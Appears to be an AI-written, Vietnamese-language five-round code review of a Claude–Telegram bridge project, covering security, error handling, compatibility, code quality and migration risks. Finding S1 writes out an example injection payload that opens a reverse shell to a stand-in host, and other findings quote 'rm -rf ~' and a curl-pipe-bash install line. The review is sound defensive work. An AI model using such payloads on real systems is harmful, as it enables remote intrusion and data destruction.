@@ -1,0 +1,850 @@
+================================================================================
+  CLAUDE BRIDGE — CODE REVIEW (5 ROUNDS)
+  Date: 2026-04-03
+  Reviewer: claude-bridge agent (claude-sonnet-4-6)
+  Scope: install.sh, daemon.py, cli.py, db.py, session.py, dispatcher.py,
+         bridge_cmd.py, notify.py, __init__.py, channel/server.ts, channel/lib.ts
+================================================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  VÒNG 1: SECURITY REVIEW
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[S1] 🔴 CRITICAL — Command injection trong bridgeCli() (channel/lib.ts, lines 405-421)
+   File: channel/lib.ts
+
+   Code:
+     const escapedArgs = args.map((a) => `"${a.replace(/"/g, '\\"')}"`).join(" ");
+     cmd = `bridge-cli ${command} ${escapedArgs}`;
+     execSync(cmd, ...)
+
+   Issue: args được escape double-quote nhưng vẫn dùng shell string interpolation.
+   Single-quote, backtick, $(), newline không bị sanitize. Nếu `command` đến từ
+   tool input (ví dụ bridge_dispatch với agent="`rm -rf ~`"), phần command không
+   được escape gì cả.
+
+   Cụ thể: `command` parameter đến thẳng từ switch-case nên safe. Nhưng `args`
+   có thể chứa shell metacharacters không bị xử lý:
+     - Single quote: \'  → không được escape → có thể break out của double-quote context
+     - Backtick hoặc $() → không bị xử lý
+     - Newline trong prompt → không bị xử lý
+
+   Ví dụ attack: prompt = 'hello"; bash -i >& /dev/tcp/evil.com/4444 0>&1; echo "x'
+
+   Fix đề xuất: Dùng execFileSync với args array thay vì build shell string:
+     execFileSync('bridge-cli', [command, ...args], { timeout: 30000, encoding: 'utf8' })
+   Hoặc dùng spawnSync. Không bao giờ dùng shell string với user data.
+
+[S2] 🟡 MEDIUM — curl | bash pipe trong install.sh (line 87)
+   File: install.sh
+
+   Code:
+     curl -fsSL https://bun.sh/install | bash >/dev/null 2>&1 || true
+
+   Issue: Đây là anti-pattern bảo mật cổ điển. Không kiểm tra:
+   - Checksum của script trước khi chạy
+   - HTTPS certificate pinning (curl -fsSL chỉ verify HTTPS nhưng không pin key)
+   - Script có thể thay đổi nội dung sau khi download
+
+   Mức risk: Thấp trong thực tế (bun.sh có uy tín), nhưng là vấn đề với
+   security-conscious users. Redirect stderr sang /dev/null làm mờ lỗi bảo mật.
+
+   Ngoài ra, install.sh bản thân cũng được install qua curl | sh — đây là
+   transitive trust chain.
+
+   Fix đề xuất: Document risk rõ ràng. Optional: dùng bun/install.sh với
+   --dry-run để show trước. Tối thiểu: bỏ >/dev/null 2>&1 khi install Bun để
+   user thấy output.
+
+[S3] 🟡 MEDIUM — CLAUDE_BRIDGE_HOME không validate — path traversal risk
+   File: src/claude_bridge/__init__.py, get_bridge_home()
+
+   Code:
+     custom = os.environ.get("CLAUDE_BRIDGE_HOME")
+     if custom:
+         return Path(custom)
+
+   Issue: Nếu user hoặc attacker đặt CLAUDE_BRIDGE_HOME=/etc hoặc /root hoặc
+   CLAUDE_BRIDGE_HOME=../../etc/passwd thì:
+   - BridgeDB sẽ tạo bridge.db trong /etc/
+   - daemon.py sẽ lưu log tại /etc/bridge-bot.log
+   - cleanup_workspace sẽ shutil.rmtree(path) trên path nguy hiểm
+
+   Nguy hiểm nhất: shutil.rmtree() trong cleanup_workspace() có thể xóa
+   system dirs nếu CLAUDE_BRIDGE_HOME được set độc hại.
+
+   Fix đề xuất:
+     - Resolve path với os.path.realpath()
+     - Từ chối các path bắt đầu bằng /etc, /usr, /root, /bin, /sbin, /sys, /proc
+     - Ít nhất: warn nếu path là system directory
+
+[S4] 🟡 MEDIUM — Bot token lộ trong .mcp.json (channel mode)
+   File: src/claude_bridge/cli.py, generate_mcp_json()
+
+   Code (lines 770-776):
+     mcp_config = {
+         "mcpServers": {
+             "bridge": {
+                 "env": {
+                     "TELEGRAM_BOT_TOKEN": bot_token,
+
+   Issue: TELEGRAM_BOT_TOKEN được hardcode plaintext vào .mcp.json file. File
+   này thường được commit vào git trong bot project directory. Nếu user accidentally
+   git push bot_dir, token sẽ lộ công khai.
+
+   .env.example đã viết đúng với comment "copy this to .env". Nhưng setup wizard
+   lại làm ngược — tạo .mcp.json với token inline.
+
+   Fix đề xuất:
+   - Thay token thực bằng placeholder "${TELEGRAM_BOT_TOKEN}" trong .mcp.json
+   - Tạo .env.local hoặc .env trong bot_dir với token thực
+   - Thêm .mcp.json vào .gitignore warning trong setup wizard
+   - Hoặc dùng env var reference: "TELEGRAM_BOT_TOKEN": "${TELEGRAM_BOT_TOKEN}"
+     và load từ .env
+
+[S5] 🟢 LOW — isAllowed() fallback: empty allowlist = allow all
+   File: channel/lib.ts, lines 78-82
+
+   Code:
+     export function isAllowed(userId: string, accessPath: string): boolean {
+       const allowed = loadAllowlist(accessPath);
+       if (allowed.length === 0) return true;  // <-- đây
+
+   Issue: Nếu config.json không tồn tại hoặc không có telegram_chat_id, mọi
+   user đều được phép gửi message đến bot. Trong quá trình setup, bot có thể
+   accessible trước khi config được set.
+
+   Fix đề xuất: Fail closed — nếu allowlist empty, từ chối tất cả và log warning.
+   Hoặc có explicit "open" mode flag thay vì dùng empty list làm "allow all".
+
+[S6] 🟢 LOW — BridgeDB __init__ không check write permission
+   File: src/claude_bridge/db.py, line 117
+
+   Code:
+     os.makedirs(os.path.dirname(db_path), exist_ok=True)
+     self.conn = sqlite3.connect(db_path)
+
+   Issue: Không check xem directory có write permission không trước khi connect.
+   Kết quả: sqlite3.OperationalError không nói rõ "permission denied" mà nói
+   "unable to open database file" — khó debug.
+
+   Fix đề xuất: Check os.access(dir, os.W_OK) trước khi connect, raise rõ ràng.
+
+[S7] 🟢 LOW — systemd service dùng "append" log mode — không có rotation
+   File: src/claude_bridge/daemon.py, lines 56-73
+
+   Code:
+     StandardOutput=append:{log_path}
+     StandardError=append:{log_path}
+
+   Issue: Không có log rotation. Service chạy lâu dài có thể fill disk.
+   Không có LogRateLimit hoặc MaxLevelStore directives.
+
+   Fix đề xuất: Thêm hướng dẫn logrotate hoặc dùng journal với StandardOutput=journal.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  VÒNG 2: ERROR HANDLING & EDGE CASES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[E1] 🔴 CRITICAL — BridgeDB connection không bao giờ đóng trong cli.py main
+   File: src/claude_bridge/cli.py (main function — chưa đọc đủ phần cuối)
+
+   Pattern chung: BridgeDB được khởi tạo và truyền vào cmd_*. Nếu cmd raise
+   exception, db.close() không được gọi. Không có try/finally hoặc context
+   manager.
+
+   Thực tế với SQLite: connection sẽ được close khi process exit, nhưng WAL
+   checkpoint có thể không được flush đúng cách nếu process crash mid-transaction.
+
+   Fix đề xuất: Wrap BridgeDB với context manager (with BridgeDB(...) as db:)
+   hoặc thêm try/finally trong main().
+
+[E2] 🔴 CRITICAL — kill_process() blocking 10 giây với time.sleep(1) trong vòng lặp
+   File: src/claude_bridge/dispatcher.py, lines 89-101
+
+   Code:
+     if graceful:
+         os.kill(pid, signal.SIGTERM)
+         for _ in range(10):
+             time.sleep(1)
+             if not pid_alive(pid):
+                 return True
+     os.kill(pid, signal.SIGKILL)
+
+   Issue: CLI blocking 10 giây trên foreground command. User experience rất tệ.
+   Với bridge-cli được gọi từ channel server (bridge_kill tool), bridgeCli() có
+   timeout 30s (lib.ts line 417) nhưng kill_process() chiếm đến 10s của 30s đó.
+
+   Fix đề xuất: Giảm wait time, hoặc thêm --timeout argument, hoặc chạy async.
+   Trong thực tế, SIGTERM thường response trong vài ms với claude CLI.
+
+[E3] 🟡 MEDIUM — install.sh: không atomic — partial failure để lại broken state
+   File: install.sh
+
+   Scenarios:
+   1. Bun install thành công nhưng bun run build fail → node_modules có, bundle không có
+   2. git clone thành công nhưng pipx install fail → repo có nhưng không có CLI
+   3. pipx install thành công nhưng channel build fail → CLI có nhưng channel server không chạy được
+
+   Issue: Mỗi step có thể fail độc lập. Không có cleanup/rollback. Rerun install.sh
+   lần 2 thường OK (idempotent) nhưng "updating existing repo" skip steps đã done.
+
+   Cụ thể: line 131-137 check node_modules exists → skip bun install. Nhưng
+   node_modules có thể corrupt từ lần install trước bị interrupt.
+
+   Fix đề xuất: Thêm health check cuối cùng verify tất cả components. Document
+   "nếu fail, xóa INSTALL_DIR và rerun" trong error messages.
+
+[E4] 🟡 MEDIUM — daemon install trên container (không có systemd user session)
+   File: src/claude_bridge/daemon.py, install_systemd()
+
+   Code (lines 96-108):
+     subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
+     subprocess.run(["systemctl", "--user", "enable", SYSTEMD_SERVICE_NAME], check=True)
+
+   Issue: Trong container environments (Docker, LXC, GitHub Actions), systemd
+   user session không có (DBUS_SESSION_BUS_ADDRESS không set). Lệnh systemctl
+   --user sẽ fail với "Failed to connect to bus: No such file or directory".
+
+   CalledProcessError được catch và trả về (False, message) — đây là behavior
+   đúng. Nhưng error message "systemctl error: ..." không giải thích tại sao,
+   không gợi ý workaround (dùng bridge start / cron).
+
+   Fix đề xuất: Detect container environment (check /proc/1/comm, DBUS_SESSION_BUS_ADDRESS)
+   trước khi attempt install. Cải thiện error message.
+
+[E5] 🟡 MEDIUM — doctor: Telegram API call không có retry
+   File: src/claude_bridge/cli.py, _cmd_doctor() lines 1409-1424
+
+   Code:
+     with urlopen(req, timeout=5) as resp:
+
+   Issue: 5 second timeout, không có retry. Nếu mạng chậm hoặc Telegram API
+   có rate limit, doctor sẽ warn "offline?" khi thực ra token valid. False
+   negative gây confusion.
+
+   Fix đề xuất: Tăng timeout lên 10s, thêm 1 retry, hoặc note rõ "network check
+   may be flaky" trong output.
+
+[E6] 🟡 MEDIUM — queue race condition: check-then-act không atomic
+   File: src/claude_bridge/db.py, lines 287-296 (cmd_dispatch in cli.py)
+
+   Code (cli.py ~line 287-296):
+     running = db.get_running_task(session_id)  # READ
+     if running:
+         # queue task
+     else:
+         task_id = db.create_task(...)  # WRITE
+         pid = spawn_task(...)           # SPAWN
+
+   Issue: Nếu 2 dispatches xảy ra concurrently (e.g., từ Telegram + CLI cùng
+   lúc), cả 2 có thể pass "not running" check và spawn 2 processes cho cùng
+   agent. SQLite WAL mode giúp concurrent reads nhưng không giải quyết
+   check-then-act race.
+
+   Fix đề xuất: Wrap trong exclusive transaction, hoặc use UPSERT/INSERT OR IGNORE
+   với unique constraint để detect concurrent dispatch.
+
+[E7] 🟡 MEDIUM — update_task() với dynamic SQL — không validate column names
+   File: src/claude_bridge/db.py, lines 269-273
+
+   Code:
+     def update_task(self, task_id: int, **kwargs):
+         sets = ", ".join(f"{k} = ?" for k in kwargs)
+         values = list(kwargs.values()) + [task_id]
+         self.conn.execute(f"UPDATE tasks SET {sets} WHERE id = ?", values)
+
+   Issue: Column names từ **kwargs được đưa thẳng vào SQL string (không phải
+   parameter). Tuy nhiên, kwargs chỉ đến từ code nội bộ (không từ user), nên
+   đây là low risk injection. Nhưng vẫn là antipattern và dễ typo gây broken SQL.
+
+   Nếu caller typo column name (e.g., "satuts" thay vì "status"), SQLite sẽ raise
+   OperationalError không nói rõ nguyên nhân.
+
+   Fix đề xuất: Whitelist allowed column names. Hoặc validate column against
+   PRAGMA table_info(tasks) at startup.
+
+[E8] 🟢 LOW — session.py: validate_project_dir không expand user home trong message
+   File: src/claude_bridge/session.py, lines 43-48
+
+   Code:
+     def validate_project_dir(path: str) -> str | None:
+         expanded = os.path.expanduser(path)
+         if not os.path.isdir(expanded):
+             return f"Directory '{path}' does not exist."
+
+   Issue: Error message trả về `path` gốc (chưa expand), không phải `expanded`.
+   Nếu user nhập "~/projects/my-api" và không tồn tại, error sẽ nói
+   "Directory '~/projects/my-api' does not exist" — đúng nhưng không show
+   expanded path để debug rõ hơn.
+
+   Minor issue — không critical.
+
+[E9] 🟢 LOW — bridge_cmd.py: CONFIG_PATH computed at import time
+   File: src/claude_bridge/bridge_cmd.py, line 39
+
+   Code:
+     CONFIG_PATH = _get_config_path()  # Computed at import
+
+   Issue: Nếu CLAUDE_BRIDGE_HOME được set sau khi module import (edge case trong
+   test hoặc subprocess reuse), CONFIG_PATH sẽ stale. Comment "set CLAUDE_BRIDGE_HOME
+   before running" là đúng nhưng dễ gây confusion. Tests phải patch module-level
+   constant.
+
+   Fix đề xuất: Tính CONFIG_PATH lazy (khi được dùng) thay vì at import time.
+   Hoặc ít nhất test rõ cách patch này trong docs.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  VÒNG 3: COMPATIBILITY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[C1] 🔴 CRITICAL — install.sh không hoạt động trên Fedora/RHEL/Arch Linux
+   File: install.sh
+
+   Issues:
+   1. Python install hint (line 66): "sudo apt install python3.12" — chỉ đúng
+      cho Debian/Ubuntu. Fedora dùng "dnf install python3.12", Arch dùng "pacman -S python".
+   2. tmux install hint (line 108): "sudo apt install tmux" — tương tự.
+   3. OS detection (line 37-47): detect_os() trả về "linux" cho mọi Linux distro,
+      không phân biệt package manager.
+
+   Real-world impact: User trên Fedora 40 sẽ thấy đúng error nhưng sai fix hint.
+
+   Fix đề xuất:
+     detect_linux_distro() {
+       if command -v apt >/dev/null; then echo "debian"
+       elif command -v dnf >/dev/null; then echo "fedora"
+       elif command -v pacman >/dev/null; then echo "arch"
+       else echo "linux"
+       fi
+     }
+
+[C2] 🟡 MEDIUM — install.sh: Bun không available trên Alpine Linux / musl libc
+   File: install.sh
+
+   Issue: Bun là binary compiled for glibc. Alpine Linux (Docker default), NixOS,
+   và musl-based systems sẽ fail install Bun với "Exec format error" hoặc "not
+   a dynamic executable".
+
+   Code (line 87):
+     curl -fsSL https://bun.sh/install | bash >/dev/null 2>&1 || true
+
+   Bun install script itself sẽ fail silently (|| true), sau đó:
+     if command -v bun >/dev/null 2>&1; then
+   → false → fail "Bun not available in current session"
+
+   Nhưng fail message không giải thích musl/glibc incompatibility.
+
+   Fix đề xuất: Detect musl trước khi try Bun install, show clear error.
+     if ldd --version 2>&1 | grep -qi musl; then
+       fail "Bun requires glibc. Alpine/musl not supported. Use Debian-based image."
+     fi
+
+[C3] 🟡 MEDIUM — daemon.py: launchd install dùng "launchctl load" (macOS 12 deprecated)
+   File: src/claude_bridge/daemon.py, lines 254-262
+
+   Code:
+     subprocess.run(["launchctl", "load", str(plist_path)], check=True)
+
+   Issue: "launchctl load" bị deprecated từ macOS 11/12. macOS 13+ (Ventura+)
+   khuyến nghị dùng "launchctl bootstrap" và "launchctl bootout". Trên macOS 15,
+   "launchctl load" vẫn work nhưng print deprecation warning.
+
+   Fix đề xuất: Detect macOS version và dùng API phù hợp:
+     if macOS >= 12: launchctl bootstrap gui/$(id -u) <plist>
+     else: launchctl load <plist>
+
+[C4] 🟡 MEDIUM — PATH issues khi install via pipx — bridge command không available
+   File: install.sh, src/claude_bridge/bridge_cmd.py
+
+   Issue: bridge-cli và bridge được install via pipx vào ~/.local/bin (hoặc
+   ~/.bun/bin trong một số setups). Khi daemon start bằng systemd --user, PATH
+   có thể không include ~/.local/bin.
+
+   daemon.py lấy bridge path qua shutil.which("bridge") tại install time — nếu
+   bridge không trong PATH lúc đó → fallback sang "python -m claude_bridge.bridge_cmd".
+
+   Nhưng python3 cũng có thể không trong PATH của systemd environment, và python3
+   từ pipx venv khác python3 hệ thống.
+
+   Fix đề xuất: Trong daemon.py, dùng sys.executable thay vì shutil.which("python3"):
+     return f"{sys.executable} -m claude_bridge.bridge_cmd"
+   Điều này đảm bảo dùng đúng Python interpreter từ môi trường hiện tại.
+
+   Thực tế: _get_bridge_cmd() đã làm fallback đúng (line 48):
+     return f"{sys.executable} -m claude_bridge.bridge_cmd"
+   Nhưng PATH trong systemd unit cần có bridge binary dir. Launchd plist thì
+   đã capture PATH env (line 241) — tốt hơn.
+
+[C5] 🟡 MEDIUM — pyproject.toml dependencies: "mcp>=1.0" nhưng CLAUDE.md nói "stdlib only"
+   File: pyproject.toml, line 13
+
+   Code:
+     dependencies = [
+         "mcp>=1.0",
+     ]
+
+   Issue: CLAUDE.md và code-style.md tuyên bố "stdlib only — no pip dependencies".
+   Nhưng pyproject.toml khai báo `mcp>=1.0` dependency. Điều này mâu thuẫn.
+
+   Thực tế: grep kết quả cho thấy mcp_server module có thể dùng MCP SDK.
+   Nhưng core package (cli.py, db.py, session.py, dispatcher.py) chỉ dùng stdlib.
+
+   Impact: Users pip install claude-agent-bridge sẽ tự động get mcp package —
+   có thể không expected. Version constraint ">=1.0" quá loose — MCP SDK có
+   breaking changes between minor versions.
+
+   Fix đề xuất: Pin cụ thể hơn "mcp>=1.0,<2.0" hoặc update CLAUDE.md để reflect
+   thực tế dependencies.
+
+[C6] 🟢 LOW — WSL (Windows Subsystem for Linux): tmux hoạt động nhưng attach không
+   File: install.sh, src/claude_bridge/bridge_cmd.py
+
+   Issue: detect_os() nhận ra WSL (line 40-42). Nhưng bridge attach dùng
+   os.execvp("tmux", ["tmux", "attach-session", ...]) — trong WSL, attach vào
+   tmux session không mở terminal mới, cần chạy trong Windows Terminal.
+
+   bridge logs -f cũng dùng os.execvp("tail", ...) — tail -f hoạt động trong WSL.
+
+   Minor: documentation issue nhiều hơn code issue.
+
+[C7] 🟢 LOW — Python 3.10 không được support mặc dù Ubuntu 22.04 ship 3.10 default
+   File: pyproject.toml, install.sh
+
+   pyproject.toml: requires-python = ">=3.11"
+   install.sh check: python3 -c 'sys.exit(0 if sys.version_info >= (3, 11) else 1)'
+
+   Issue: Ubuntu 22.04 LTS (còn trong support đến 2027) ship Python 3.10 by
+   default. Users on Ubuntu 22.04 phải install python3.11 hoặc python3.12 thêm.
+   Error message (line 64-68) gợi ý "sudo apt install python3.12" nhưng cần
+   deadsnakes PPA trên Ubuntu 22.04.
+
+   Fix đề xuất: Thêm vào error message: "Ubuntu 22.04: sudo add-apt-repository ppa:deadsnakes/ppa && sudo apt install python3.12"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  VÒNG 4: CODE QUALITY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[Q1] 🟡 MEDIUM — Code duplication: config.json loading lặp lại nhiều chỗ
+   Files: cli.py (lines 427-445, 490-502, 506-514, 527-536, 559-568),
+          bridge_cmd.py (_load_config), notify.py (get_bot_token, get_default_telegram_chat_id)
+
+   Issue: Pattern load config.json xuất hiện ít nhất 7-8 lần:
+     config = {}
+     if os.path.isfile(config_path):
+         try:
+             with open(config_path) as f:
+                 config = json.load(f)
+         except (json.JSONDecodeError, IOError):
+             pass
+
+   Mỗi chỗ handle IOError khác nhau, một số bỏ qua IOError, một số không.
+   bridge_cmd.py có _load_config() làm helper. cli.py thì inline everywhere.
+
+   Fix đề xuất: Extract ra module-level utility:
+     def load_config() -> dict:
+         from . import get_bridge_home
+         config_path = get_bridge_home() / "config.json"
+         try: return json.loads(config_path.read_text())
+         except (json.JSONDecodeError, IOError, OSError): return {}
+
+[Q2] 🟡 MEDIUM — cli.py quá lớn (1700+ dòng) — vi phạm single responsibility
+   File: src/claude_bridge/cli.py
+
+   Issue: cli.py chứa:
+   - Argument parsing (build_parser)
+   - 20+ command handlers (cmd_*)
+   - Config management (cmd_setup, cmd_setup_telegram, generate_mcp_json)
+   - Daemon management wrappers (_cmd_daemon)
+   - Doctor diagnostics (_cmd_doctor)
+   - Uninstall logic (_cmd_uninstall)
+   - Team management (cmd_create_team, cmd_team_dispatch, ...)
+   - Cron management (cmd_setup_cron, cmd_remove_cron)
+
+   Mâu thuẫn với CLAUDE.md: "Single responsibility per module"
+
+   Fix đề xuất: Tách thành:
+   - commands/setup.py (setup, setup-telegram, setup-bot)
+   - commands/agent.py (create-agent, delete-agent, list-agents)
+   - commands/task.py (dispatch, kill, queue, cancel, cost)
+   - commands/team.py (create-team, team-dispatch, ...)
+
+[Q3] 🟡 MEDIUM — Dead code / inconsistency: db.py import `datetime` hai lần
+   File: src/claude_bridge/db.py
+
+   Code:
+     Line 10: from datetime import datetime
+     Line 339: from datetime import datetime  (inside method respond_permission)
+     Line 351: from datetime import datetime  (inside method timeout_permissions)
+
+   Issue: datetime đã được import ở top-level (line 10). Import lại bên trong
+   methods là redundant và confusing. Tuy nhiên: line 10 import là `from datetime
+   import datetime` (class), và bên trong methods cũng vậy — nên không có
+   conflict, chỉ là dead/redundant import.
+
+   Fix đề xuất: Remove in-method imports (lines 339, 351). Dùng top-level import.
+
+[Q4] 🟡 MEDIUM — _build_team_prompt() hardcodes PYTHONPATH — brittle
+   File: src/claude_bridge/cli.py, lines 1117-1145
+
+   Code:
+     return f"""...
+     To dispatch sub-tasks to teammates, use the Bash tool:
+       PYTHONPATH={os.path.dirname(os.path.dirname(os.path.abspath(__file__)))} python3 -m claude_bridge.cli dispatch ...
+     """
+
+   Issue: Path được hardcode từ __file__ location tại runtime. Nếu package
+   được install via pipx (không phải editable), __file__ point đến site-packages,
+   PYTHONPATH là site-packages path — OK nhưng fragile.
+
+   Nếu bridge-cli binary available, nên dùng bridge-cli thay vì PYTHONPATH trick.
+
+   Fix đề xuất: Check shutil.which("bridge-cli") first, nếu có thì dùng bridge-cli,
+   fallback mới dùng PYTHONPATH approach.
+
+[Q5] 🟡 MEDIUM — Naming inconsistency: agent_file vs agent_file_name vs agent_file_path
+   Files: cli.py, session.py, db.py
+
+   Issue: Cùng một khái niệm (agent .md file) được gọi bằng nhiều tên:
+   - derive_agent_file_name() → trả về string như "bridge--backend--my-api"
+   - get_agent_file_path() → trả về full path với .md extension
+   - db.create_agent(..., agent_file=...) → có thể là name hoặc path
+   - db stores "agent_file" — nhìn vào code, đây là full path
+
+   Cụ thể trong cli.py cmd_create_agent:
+     agent_file_name = derive_agent_file_name(session_id)  # name only
+     agent_file_path = write_agent_md(session_id, content)  # full path
+     db.create_agent(..., agent_file=agent_file_path)       # stores path
+
+   Nhưng sau đó:
+     agent_file_name = derive_agent_file_name(session_id)  # reuse same name var
+
+   Naming convention không nhất quán dễ gây nhầm lẫn.
+
+   Fix đề xuất: Chuẩn hóa: "agent_slug" cho "bridge--name--project",
+   "agent_md_path" cho full path.
+
+[Q6] 🟡 MEDIUM — VALID_MODELS tuple defined inline tại nhiều chỗ
+   File: src/claude_bridge/cli.py
+
+   Issue: ("sonnet", "opus", "haiku") xuất hiện ít nhất 2 lần:
+   - cmd_create_agent (line 197): VALID_MODELS = ("sonnet", "opus", "haiku")
+   - cmd_set_model (line 948): VALID_MODELS = ("sonnet", "opus", "haiku")
+
+   Nếu thêm model mới, phải update cả 2 chỗ.
+
+   Fix đề xuất: Extract as module-level constant:
+     VALID_MODELS = ("sonnet", "opus", "haiku")
+
+[Q7] 🟢 LOW — Thiếu type hints trên một số functions
+   Files: cli.py
+
+   Issue: cmd_* functions nhận `args` không có type annotation:
+     def cmd_create_agent(db: BridgeDB, args):
+
+   Nên là: `args: argparse.Namespace` hoặc Protocol type.
+
+   _build_team_prompt không có return type annotation.
+
+   Minor — không vi phạm chức năng nhưng vi phạm code-style.md rule.
+
+[Q8] 🟢 LOW — cleanup() trong server.ts: setTimeout racing với process.exit(0)
+   File: channel/server.ts, lines 790-802
+
+   Code:
+     let cleanedUp = false;
+     function cleanup() {
+       ...
+       setTimeout(() => process.exit(1), 2000);
+       process.exit(0);  // <- đây gọi trước setTimeout fires
+     }
+
+   Issue: process.exit(0) được gọi ngay lập tức — setTimeout(() => process.exit(1), 2000)
+   sẽ không bao giờ fire vì process đã exit. Comment "Force exit after 2s in case
+   bot.stop() hangs" là sai — thực tế bot.stop() không được await.
+
+   Nếu muốn force exit sau 2s khi bot.stop() hang, cần await bot.stop() trước:
+     await bot.stop();  // với timeout
+     process.exit(0);
+
+   Hoặc: Move process.exit(0) vào sau bot.stop() callback.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  VÒNG 5: REGRESSION RISK
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[R1] 🔴 CRITICAL — get_bridge_home() thay thế hardcoded path nhưng db.py vẫn có hardcoded fallback risk
+   File: src/claude_bridge/db.py, src/claude_bridge/__init__.py
+
+   Issue: _default_db_path() gọi get_bridge_home() tốt. Nhưng _cmd_doctor() trong
+   cli.py (line 1427) hardcode:
+     db_path = os.path.join(bridge_home, "bridge.db")
+
+   Và bridge_home = str(get_bridge_home()) — thực ra OK vì get từ function.
+
+   Deeper issue: Nếu CLAUDE_BRIDGE_HOME thay đổi giữa các lần gọi (ví dụ test
+   isolation), có thể có multiple DB files. Config và database path phải nhất
+   quán. Hiện tại cả 2 đều dùng get_bridge_home() — nhất quán. Tốt.
+
+   Tuy nhiên: bridge_cmd.py line 39:
+     CONFIG_PATH = _get_config_path()  # computed at IMPORT TIME
+
+   Nếu CLAUDE_BRIDGE_HOME thay đổi sau import (trong subprocess hoặc test),
+   CONFIG_PATH sẽ stale. Các modules khác gọi get_bridge_home() lazily nên OK.
+   Bridge_cmd là module duy nhất có vấn đề này.
+
+[R2] 🔴 CRITICAL — Existing agents/hooks bị ảnh hưởng nếu get_bridge_home() path thay đổi
+   Files: src/claude_bridge/agent_md.py (chưa đọc), src/claude_bridge/session.py
+
+   Issue: Agent .md files được stored tại ~/.claude/agents/ (hardcoded trong
+   session.py get_agent_file_path, line 64-65):
+     return os.path.expanduser(f"~/.claude/agents/{name}.md")
+
+   Đây KHÔNG dùng get_bridge_home() — path này là hardcoded. Đúng theo
+   architecture (Claude Code owns ~/.claude/agents/).
+
+   Workspace directory dùng get_bridge_home() (session.py get_workspace_dir):
+     return str(get_bridge_home() / "workspaces" / session_id)
+
+   Nếu user thay đổi CLAUDE_BRIDGE_HOME sau khi đã có agents:
+   - Agent .md files: vẫn ở ~/.claude/agents/ (unaffected — đúng)
+   - Workspaces: bây giờ ở new path (old workspaces orphaned)
+   - DB: bây giờ ở new path (new, empty DB — agents "disappeared")
+
+   Đây là expected behavior (CLAUDE_BRIDGE_HOME là data dir), nhưng cần document.
+
+   Stop hook trong project settings.json cũng gọi bridge-cli với session_id —
+   không hardcode path, so OK.
+
+[R3] 🟡 MEDIUM — Version 0.2.0 bump: existing config.json format cũ có bị break?
+   File: src/claude_bridge/__init__.py, src/claude_bridge/bridge_cmd.py
+
+   Issue: _validate_config() (bridge_cmd.py lines 112-133) check:
+     - bot_dir: required
+     - telegram_bot_token: required
+     - mode: must be "channel", "mcp", or "" (empty)
+
+   Nếu old config từ v0.1.x không có "mode" field:
+     mode = config.get("mode", "")
+     if mode not in ("channel", "mcp", ""):  # "" is allowed — OK
+
+   Empty mode allowed, treated as "mcp" mode in _build_claude_command():
+     mode = config.get("mode", "mcp")
+
+   Vậy: old configs không có "mode" → "" → _validate_config OK, _build_claude_command
+   dùng "mcp" default. Backward compatible.
+
+   Nếu old config có "bot_dir" trỏ đến path không tồn tại:
+     elif not os.path.isdir(bot_dir):
+         errors.append(f"❌ bot_dir not found: {bot_dir}  →  Run: bridge-cli setup")
+
+   User sẽ thấy error và cần rerun setup. Acceptable.
+
+[R4] 🟡 MEDIUM — channel server path changes: deployed path vs bundled path
+   File: src/claude_bridge/cli.py generate_mcp_json() (lines 753-763)
+
+   Issue: .mcp.json được generate với channel_path. Logic:
+   1. Check deployed path: ~/.claude-bridge/channel/dist/server.js
+   2. Fallback: bundled trong package
+   3. Fallback: source dir channel/server.ts
+
+   Nếu user upgrade package (pip install --upgrade) nhưng không rerun setup:
+   - New bundled path tồn tại
+   - Old deployed path cũng tồn tại (từ setup trước)
+   - .mcp.json vẫn point đến OLD deployed path
+   - Old deployed path là OLD version của server
+
+   Kết quả: Sau upgrade, bot vẫn chạy old channel server cho đến khi user rerun
+   bridge-cli setup. Không crash nhưng miss new features/fixes.
+
+   Fix đề xuất: Trong bridge-cli doctor --fix, auto-redeploy channel server.
+   Hoặc compare version/hash của bundled vs deployed.
+
+[R5] 🟡 MEDIUM — `reported` column migration: old DB missing column sẽ fail INDEX
+   File: src/claude_bridge/db.py, SCHEMA (line 105-106)
+
+   Code:
+     CREATE INDEX IF NOT EXISTS idx_tasks_unreported ON tasks(status, reported)
+         WHERE status IN ('done', 'failed', 'timeout') AND reported = 0;
+
+   Migration code (lines 143-152) không migrate `reported` column:
+     migrations = [
+         ("tasks", "position", "INTEGER"),
+         ("tasks", "model", "TEXT"),
+         ...
+         # "reported" NOT in list!
+     ]
+
+   Tuy nhiên: _migrate() runs TRƯỚC executescript(SCHEMA). Nếu `reported` column
+   không tồn tại, CREATE INDEX sẽ fail với "no such column: reported".
+
+   Thực tế: `reported` column được create trong SCHEMA:
+     `reported INTEGER DEFAULT 0`
+
+   CREATE TABLE IF NOT EXISTS sẽ không add columns nếu table đã tồn tại.
+   Nên nếu table existed từ old DB mà không có `reported`, schema init sẽ skip
+   ADD COLUMN (vì không trong migrations list), rồi CREATE INDEX sẽ fail.
+
